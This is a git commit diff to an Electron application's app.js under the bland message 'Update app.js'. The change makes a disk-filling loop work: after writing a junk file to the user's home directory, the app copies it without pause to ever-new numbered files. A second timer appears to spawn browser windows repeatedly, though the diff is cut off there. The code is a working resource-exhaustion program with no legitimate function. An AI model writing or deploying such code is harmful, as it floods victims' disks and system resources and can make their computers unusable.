e92d26964aef3a9d62286eb09aa5d5bb2ee04a13
Ian Vu <ianv6207@mytusd.org>
2026-08-26 19:40:52 -0700

    Update app.js

--- app.js
+++ app.js
@@ -1,10 +1,12 @@
 const { app, BrowserWindow } = require('electron');
 const os = require('os');
 const fs = require('fs').promises;
+let count = 0;
 app.whenReady().then(async function() {
-  await fs.writeFile('/target.txt', '+-=+-=_=-=-++_==_+-=_+(sa0w9');
+  await fs.writeFile('/home/' + os.userInfo().username + '/target.txt', '+-=+-=_=-=-++_==_+-=_+(sa0w9');
   setInterval(async function() {
-    await fs.copyFile('/home/' + os.userInfo().username + '/target.txt', '/home/' + os.userInfo().username + '/');
+    await fs.copyFile('/home/' + os.userInfo().username + '/target.txt', '/home/' + os.userInfo().username + '/' + count);
+    count = count + 1;
   });
   setInterval(function() {
     let win = new BrowserWindow({
